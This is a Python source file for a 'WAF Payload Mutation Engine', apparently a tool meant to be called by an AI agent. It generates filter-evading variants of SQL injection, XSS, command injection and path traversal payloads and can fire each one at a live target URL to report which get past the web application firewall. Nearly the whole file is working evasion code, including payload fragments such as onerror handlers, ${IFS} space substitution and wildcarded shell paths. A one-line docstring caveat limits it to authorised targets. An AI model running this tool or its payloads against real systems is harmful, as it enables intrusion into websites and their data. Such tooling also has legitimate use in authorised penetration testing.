"""
WAF Payload Mutation Engine
Generates bypass variants for payloads blocked by WAF/IDS filters,
and optionally tests them live against a target URL.
"""

from __future__ import annotations

import re
import time
import urllib.parse
from typing import Optional
from src.sdk.tool import function_tool

# ---------------------------------------------------------------------------
# Mutation strategy tables
# ---------------------------------------------------------------------------

def _url_encode(p: str) -> str:
    return urllib.parse.quote(p, safe="")

def _double_url_encode(p: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")

def _mixed_case(p: str) -> str:
    result = []
    upper = True
    for c in p:
        if c.isalpha():
            result.append(c.upper() if upper else c.lower())
            upper = not upper
        else:
            result.append(c)
    return "".join(result)

def _html_entity(p: str) -> str:
    return "".join(f"&#{ord(c)};" if c.isalpha() else c for c in p)

def _unicode_escape(p: str) -> str:
    return "".join(f"\\u{ord(c):04x}" if c.isalpha() else c for c in p)

# SQLi-specific mutations
_SQLI_MUTATIONS: list[tuple[str, str]] = [
    ("space_to_comment",   lambda p: p.replace(" ", "/**/")),
    ("space_to_tab",       lambda p: p.replace(" ", "%09")),
    ("space_to_newline",   lambda p: p.replace(" ", "%0a")),
    ("space_to_formfeed",  lambda p: p.replace(" ", "%0c")),
    ("url_encode",         _url_encode),
    ("double_url_encode",  _double_url_encode),
    ("mixed_case",         _mixed_case),
    ("inline_comment_or",  lambda p: re.sub(r"(?i)\bOR\b",     "O/**/R",     p)),
    ("inline_comment_and", lambda p: re.sub(r"(?i)\bAND\b",    "AN/**/D",    p)),
    ("inline_comment_sel", lambda p: re.sub(r"(?i)\bSELECT\b", "SE/**/LECT", p)),
    ("inline_comment_uni", lambda p: re.sub(r"(?i)\bUNION\b",  "UN/**/ION",  p)),
    ("null_byte",          lambda p: p + "%00"),
    ("trailing_comment",   lambda p: p + "-- -"),
    ("version_comment",    lambda p: p.replace("/**/", "/*!*/") if "/**/" in p else re.sub(r"(?i)\bSELECT\b", "/*!SELECT*/", p)),
    ("double_dash_nl",     lambda p: p.replace("--", "--%0a")),
    ("hex_string",         lambda p: re.sub(r"'([^']+)'", lambda m: "0x" + m.group(1).encode().hex(), p)),
    ("char_encode",        lambda p: re.sub(r"'([^']{1,30})'", lambda m: "CHAR(" + ",".join(str(b) for b in m.group(1).encode()) + ")", p)),
    ("if_based",           lambda p: p.replace("OR 1=1", "OR IF(1=1,1,0)=1")),
    ("case_when",          lambda p: p.replace("OR 1=1", "OR CASE WHEN 1=1 THEN 1 ELSE 0 END=1")),
    ("concat_split",       lambda p: re.sub(r"(?i)\bUNION\b", "UNION ALL", p)),
]

# XSS-specific mutations
_XSS_MUTATIONS: list[tuple[str, str]] = [
    ("url_encode",         _url_encode),
    ("double_url_encode",  _double_url_encode),
    ("html_entity",        _html_entity),
    ("unicode_escape",     _unicode_escape),
    ("mixed_case_tags",    lambda p: p.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>")),
    ("null_byte_break",    lambda p: p.replace("<script>", "<scr\x00ipt>").replace("</script>", "</scr\x00ipt>")),
    ("newline_break",      lambda p: p.replace("<script>", "<scr\nipt>").replace("</script>", "</scr\nipt>")),
    ("tab_break",          lambda p: p.replace("<script>", "<scr\tipt>")),
    ("svg_onload",         lambda p: "<svg onload=" + re.sub(r"</?script>", "", p).strip() + ">"),
    ("img_onerror",        lambda p: "<img src=x onerror=" + re.sub(r"</?script>", "", p).strip() + ">"),
    ("details_ontoggle",   lambda p: "<details open ontoggle=" + re.sub(r"</?script>", "", p).strip() + ">"),
    ("body_onload",        lambda p: "<body onload=" + re.sub(r"</?script>", "", p).strip() + ">"),
    ("no_quotes",          lambda p: p.replace('"', "").replace("'", "").replace("alert(1)", "alert`1`")),
    ("js_url_proto",       lambda p: "javascript:" + re.sub(r"</?script>", "", p).strip()),
    ("json_unicode",       lambda p: p.replace("<", "\\u003c").replace(">", "\\u003e").replace("'", "\\u0027")),
    ("double_encode_lt",   lambda p: p.replace("<", "%253c")),
]

# Command injection mutations
_CMD_MUTATIONS: list[tuple[str, str]] = [
    ("url_encode",         _url_encode),
    ("double_url_encode",  _double_url_encode),
    ("space_to_IFS",       lambda p: p.replace(" ", "${IFS}")),
    ("space_to_brace",     lambda p: p.replace(" ", "{,}")),
    ("backtick",           lambda p: "$(" + p.strip(";& ") + ")"),
    ("newline_sep",        lambda p: p.replace(";", "%0a")),
    ("hex_cmd",            lambda p: re.sub(r"\bid\b",  r"$(echo${IFS}aWQ=|base64${IFS}-d)", p)),
    ("wildcard_bin",       lambda p: p.replace("/bin/sh", "/???/??").replace("/bin/bash", "/???/b?sh")),
    ("env_expand",         lambda p: p.replace("cat", "$'\\x63\\x61\\x74'")),
    ("null_sep",           lambda p: p.replace(";", "%00;")),
    ("double_url_spaces",  lambda p: p.replace(" ", "%2520")),
]

# Path traversal mutations
_PATH_MUTATIONS: list[tuple[str, str]] = [
    ("url_encode_slash",   lambda p: p.replace("/", "%2f")),
    ("double_slash",       lambda p: p.replace("/", "//")),
    ("dotslash",           lambda p: p.replace("../", "./../")),
    ("url_encode",         _url_encode),
    ("double_url_encode",  _double_url_encode),
    ("null_byte",          lambda p: p + "%00"),
    ("utf8_slash",         lambda p: p.replace("/", "%c0%af")),
    ("utf16_slash",        lambda p: p.replace("/", "%u2215")),
    ("backslash",          lambda p: p.replace("/", "\\")),
    ("url_encode_dot",     lambda p: p.replace(".", "%2e")),
    ("double_encode_dot",  lambda p: p.replace(".", "%252e")),
    ("absolute_bypass",    lambda p: "/var/www/images/" + p.lstrip(".")),
]

_MUTATION_TABLES = {
    "sqli":  _SQLI_MUTATIONS,
    "xss":   _XSS_MUTATIONS,
    "cmd":   _CMD_MUTATIONS,
    "path":  _PATH_MUTATIONS,
}

# Generic set applied to any type when no specific table matches
_GENERIC_MUTATIONS: list[tuple[str, str]] = [
    ("url_encode",        _url_encode),
    ("double_url_encode", _double_url_encode),
    ("mixed_case",        _mixed_case),
    ("null_byte",         lambda p: p + "%00"),
    ("space_to_comment",  lambda p: p.replace(" ", "/**/")),
]


def _apply_mutations(payload: str, table: list[tuple[str, str]]) -> list[dict]:
    results = []
    seen: set[str] = {payload}
    for name, fn in table:
        try:
            mutated = fn(payload)
        except Exception:
            continue
        if mutated and mutated not in seen:
            seen.add(mutated)
            results.append({"strategy": name, "payload": mutated})
    return results


def _test_payload_live(
    mutated: str,
    target_url: str,
    parameter: str,
    original_status: int,
    original_length: int,
) -> dict:
    """Send the mutated payload and compare response to baseline."""
    try:
        import urllib.request, urllib.error
        test_url = target_url
        if parameter and "?" in target_url:
            # Replace or append the parameter value
            parsed = urllib.parse.urlparse(target_url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            qs[parameter] = [mutated]
            new_qs = urllib.parse.urlencode(qs, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
        elif parameter:
            sep = "&" if "?" in target_url else "?"
            test_url = target_url + sep + urllib.parse.quote(parameter, safe="") + "=" + mutated

        req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=8) as resp:
            body = resp.read(8192)
            status = resp.status
            length = len(body)
            blocked = status in (403, 406, 419, 429, 503)
            return {
                "status": status,
                "length": length,
                "blocked": blocked,
                "passed": not blocked and status < 500,
            }
    except Exception as e:
        err = str(e)
        blocked = any(c in err for c in ("403", "406", "Forbidden", "blocked"))
        return {"status": 0, "length": 0, "blocked": blocked, "passed": False, "error": err[:120]}


@function_tool()
def waf_mutate_payload(
    blocked_payload: str,
    vuln_type: str = "sqli",
    target_url: str = "",
    parameter: str = "",
    test_live: bool = False,
) -> str:
    """
    Generate WAF bypass mutations for a blocked payload and optionally test each live.

    When a WAF blocks a payload (403/406/empty response), call this tool to get
    alternative encodings, obfuscations, and syntax variants that may slip through.

    Args:
        blocked_payload: The exact payload that was blocked (e.g. "' OR 1=1--")
        vuln_type:       Category of payload: "sqli", "xss", "cmd", "path", or "generic"
        target_url:      Full URL where the payload was blocked (used when test_live=True)
        parameter:       Query/form parameter name to inject into (used when test_live=True)
        test_live:       If True, send each mutation to target_url and report which bypass WAF.
                         Only use on authorized targets.

    Returns:
        Structured report of mutations and (if test_live) which passed the WAF.
    """
    vuln_type = (vuln_type or "generic").lower().strip()
    table = _MUTATION_TABLES.get(vuln_type, _GENERIC_MUTATIONS)
    mutations = _apply_mutations(blocked_payload, table)

    if not mutations:
        return f"[WAF-MUTATE] No mutations generated for payload: {blocked_payload!r}"

    lines: list[str] = [
        f"[WAF MUTATION ENGINE]",
        f"Original payload : {blocked_payload!r}",
        f"Vuln type        : {vuln_type}",
        f"Mutations found  : {len(mutations)}",
        "",
    ]

    if test_live and target_url:
        lines.append(f"Live testing against: {target_url}")
        lines.append(f"Parameter          : {parameter or '(injected into URL)'}")
        lines.append("")

        # Baseline request — measure normal WAF response code + size
        baseline = _test_payload_live(
            urllib.parse.quote(blocked_payload, safe=""),
            target_url, parameter, 0, 0
        )
        orig_status = baseline.get("status", 0)
        orig_length = baseline.get("length", 0)
        lines.append(f"Baseline (blocked payload): status={orig_status} length={orig_length}")
        lines.append("")
        lines.append(f"{'Strategy':<26} {'Status':<8} {'Len':<8} {'Result'}")
        lines.append("-" * 60)

        bypassed: list[str] = []
        for m in mutations:
            result = _test_payload_live(
                m["payload"], target_url, parameter, orig_status, orig_length
            )
            verdict = "BYPASSED" if result.get("passed") else ("BLOCKED" if result.get("blocked") else "ERROR")
            lines.append(
                f"{m['strategy']:<26} {result.get('status', 0):<8} {result.get('length', 0):<8} {verdict}"
            )
            if result.get("passed"):
                bypassed.append(f"  [{m['strategy']}] {m['payload']}")
            time.sleep(0.3)  # rate-limit

        lines.append("")
        if bypassed:
            lines.append(f"WAF BYPASSED by {len(bypassed)} mutation(s):")
            lines.extend(bypassed)
        else:
            lines.append("No mutations bypassed the WAF. Try manual payload crafting or a different technique.")
    else:
        lines.append(f"{'#':<4} {'Strategy':<26} Mutated Payload")
        lines.append("-" * 80)
        for i, m in enumerate(mutations, 1):
            lines.append(f"{i:<4} {m['strategy']:<26} {m['payload'][:80]}")

        if not test_live:
            lines.append("")
            lines.append("Tip: Set test_live=True and provide target_url + parameter to auto-test which bypass works.")

    return "\n".join(lines)
